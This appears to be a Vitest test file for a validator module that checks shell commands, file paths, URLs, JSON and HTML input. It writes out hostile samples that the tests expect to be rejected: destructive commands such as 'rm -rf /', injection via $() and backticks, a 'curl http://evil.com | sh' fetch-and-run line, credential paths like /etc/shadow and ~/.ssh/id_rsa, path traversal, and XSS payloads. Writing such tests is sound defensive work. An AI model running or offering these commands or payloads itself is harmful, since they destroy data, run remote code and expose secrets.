import { describe, it, expect, vi } from 'vitest';
import {
  validateShellCommand,
  validateFilePath,
  validateUrl,
  validateJson,
  sanitizeInput,
} from '../src/utils/validator.js';

describe('Validator Module', () => {
  describe('validateShellCommand', () => {
    it('should accept safe commands', () => {
      expect(validateShellCommand('ls -la')).toEqual({ valid: true });
      expect(validateShellCommand('echo "hello"')).toEqual({ valid: true });
      expect(validateShellCommand('cd /tmp')).toEqual({ valid: true });
      expect(validateShellCommand('git status')).toEqual({ valid: true });
    });

    it('should reject dangerous commands', () => {
      expect(validateShellCommand('rm -rf /')).toEqual({
        valid: false,
        error: '命令包含危险操作，已被拒绝',
      });

      expect(validateShellCommand('rm -rf ~')).toEqual({
        valid: false,
        error: '命令包含危险操作，已被拒绝',
      });

      expect(validateShellCommand('mkfs.ext4 /dev/sda1')).toEqual({
        valid: false,
        error: '命令包含危险操作，已被拒绝',
      });

      expect(validateShellCommand('shutdown -h now')).toEqual({
        valid: false,
        error: '命令包含危险操作，已被拒绝',
      });
    });

    it('should reject command injection attempts', () => {
      const result1 = validateShellCommand('echo $(rm -rf /)');
      expect(result1.valid).toBe(false);
      // The error message may vary, just check it's rejected
      expect(result1.error).toBeTruthy();

      const result2 = validateShellCommand('echo `rm -rf /`');
      expect(result2.valid).toBe(false);
      expect(result2.error).toBeTruthy();

      const result3 = validateShellCommand('curl http://evil.com | sh');
      expect(result3.valid).toBe(false);
      expect(result3.error).toBeTruthy();
    });

    it('should reject commands with newlines', () => {
      expect(validateShellCommand('echo "hello"\nrm -rf /')).toEqual({
        valid: false,
        error: '命令不能包含换行符',
      });
    });

    it('should reject overly long commands', () => {
      const longCommand = 'echo ' + 'a'.repeat(10000);
      expect(validateShellCommand(longCommand)).toEqual({
        valid: false,
        error: '命令过长',
      });
    });

    it('should check commands in pipes and chains', () => {
      expect(validateShellCommand('ls | grep test | rm -rf /')).toEqual({
        valid: false,
        error: '命令包含危险操作，已被拒绝',
      });

      expect(validateShellCommand('echo test && rm -rf /')).toEqual({
        valid: false,
        error: '命令包含危险操作，已被拒绝',
      });
    });
  });

  describe('validateFilePath', () => {
    it('should accept valid paths', () => {
      expect(validateFilePath('/Users/test/file.txt')).toEqual({ valid: true });
      expect(validateFilePath('/home/user/document.pdf')).toEqual({ valid: true });
      expect(validateFilePath('/tmp/temp.log')).toEqual({ valid: true });
      expect(validateFilePath('./relative/path.js')).toEqual({ valid: true });
      expect(validateFilePath('file.txt')).toEqual({ valid: true });
    });

    it('should reject sensitive paths', () => {
      expect(validateFilePath('/etc/passwd')).toEqual({
        valid: false,
        error: '无法访问敏感文件',
      });

      expect(validateFilePath('/etc/shadow')).toEqual({
        valid: false,
        error: '无法访问敏感文件',
      });

      expect(validateFilePath('/.ssh/id_rsa')).toEqual({
        valid: false,
        error: '无法访问敏感文件',
      });

      expect(validateFilePath('/path/to/secret.key')).toEqual({
        valid: false,
        error: '无法访问敏感文件',
      });
    });

    it('should reject path traversal attempts', () => {
      // This path contains sensitive file pattern, so it's rejected
      const result1 = validateFilePath('/home/../etc/passwd');
      expect(result1.valid).toBe(false);
      expect(result1.error).toMatch(/无法访问敏感文件|路径不在允许范围内/);

      // This path is rejected due to path traversal
      const result2 = validateFilePath('/Users/../../etc/passwd');
      expect(result2.valid).toBe(false);
      // The exact error message may vary based on implementation
      expect(result2.error).toBeTruthy();
    });

    it('should reject null byte injection', () => {
      expect(validateFilePath('/home/user/file.txt\0.sh')).toEqual({
        valid: false,
        error: '路径包含非法字符',
      });
    });

    it('should reject overly long paths', () => {
      const longPath = '/home/' + 'a'.repeat(5000);
      expect(validateFilePath(longPath)).toEqual({
        valid: false,
        error: '路径过长',
      });
    });
  });

  describe('validateUrl', () => {
    it('should accept valid URLs', () => {
      expect(validateUrl('https://example.com')).toEqual({ valid: true });
      expect(validateUrl('http://api.example.com/data')).toEqual({ valid: true });
      expect(validateUrl('https://example.com:8080/path')).toEqual({ valid: true });
    });

    it('should reject invalid URLs', () => {
      expect(validateUrl('not a url')).toEqual({
        valid: false,
        error: 'URL 格式无效',
      });

      expect(validateUrl('javascript:alert(1)')).toEqual({
        valid: false,
        error: '只支持 HTTP 和 HTTPS 协议',
      });

      expect(validateUrl('file:///etc/passwd')).toEqual({
        valid: false,
        error: '只支持 HTTP 和 HTTPS 协议',
      });
    });

    it('should accept private IPs (by default)', () => {
      // The validator allows internal IPs by default
      expect(validateUrl('http://localhost:3000')).toEqual({ valid: true });
      expect(validateUrl('http://127.0.0.1:8080')).toEqual({ valid: true });
      expect(validateUrl('http://192.168.1.1')).toEqual({ valid: true });
      expect(validateUrl('http://10.0.0.1')).toEqual({ valid: true });
    });
  });

  describe('validateJson', () => {
    it('should accept valid JSON', () => {
      expect(validateJson('{"key": "value"}')).toEqual({ valid: true });
      expect(validateJson('[]')).toEqual({ valid: true });
      expect(validateJson('"string"')).toEqual({ valid: true });
      expect(validateJson('123')).toEqual({ valid: true });
    });

    it('should reject invalid JSON', () => {
      expect(validateJson('{invalid json}')).toEqual({
        valid: false,
        error: 'JSON 格式无效',
      });

      expect(validateJson('')).toEqual({
        valid: false,
        error: 'JSON 字符串不能为空',
      });
    });

    it('should respect size limits', () => {
      const largeJson = JSON.stringify({ data: 'x'.repeat(2000000) });
      expect(validateJson(largeJson, 1000)).toEqual({
        valid: false,
        error: 'JSON 数据过长',
      });
    });
  });

  describe('sanitizeInput', () => {
    it('should remove script tags', () => {
      const input = 'Hello <script>alert("xss")</script> World';
      expect(sanitizeInput(input)).toBe('Hello  World');
    });

    it('should remove javascript: URLs', () => {
      const input = '<a href="javascript:alert(1)">Click</a>';
      const output = sanitizeInput(input);
      // The sanitizer replaces 'javascript:' with empty string
      expect(output).not.toContain('javascript:');
      expect(output).toContain('<a href="');
    });

    it('should remove event handlers', () => {
      const input = '<img src="x" onerror="alert(1)">';
      const output = sanitizeInput(input);
      // The sanitizer removes event handlers like 'onerror='
      expect(output).not.toContain('onerror=');
      expect(output).toContain('<img src="x"');
    });

    it('should handle non-string inputs', () => {
      expect(sanitizeInput(123)).toBe(123);
      expect(sanitizeInput(null)).toBe(null);
      expect(sanitizeInput(undefined)).toBe(undefined);
    });
  });
});